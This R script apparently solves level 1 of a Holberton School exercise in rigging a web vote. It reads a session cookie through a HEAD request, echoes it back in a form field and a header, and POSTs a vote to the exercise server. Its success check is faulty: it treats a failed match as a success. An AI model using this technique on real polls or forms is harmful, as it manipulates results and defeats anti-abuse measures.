# ===---Description------------------------------------------------------------===
#   Solution for the Hodor Project, Level 1 by Julien Barbier.
#   Using a R Language script with httr library.
#   To run this file install R language and run:
#   $ R -f filename
#
#   by Alexandro de Oliveira, for Holberton School
# ===---------------------------------------------------------------------------===

library('httr')

url     <- "http://173.246.108.142/level1.php"
head    <- HEAD(url)            # Head request
cookie  <- cookies(head)$value
body    <- list(id = "23", holdthedoor = "submit", key = cookie)
header  <- add_headers("User-Agent" = "havk64 R Language Requests", "Cookie" = paste("HoldTheDoor", cookie, sep="="))

for(i in 1:1) {
    p <- POST(url, body = body, encode = "form", header)
    s <- content(p, "text", encoding = 'UTF8')[1]
    match = grep("I voted!", s, perl=TRUE, value=FALSE) # Regexp to check of vote is valid.
    if(!is.null(match)) {
        cat("Vote number: ", i, "\n")
    } else {
        cat( "Failed...", "\n")
    }
    cat(s, "\n")
}
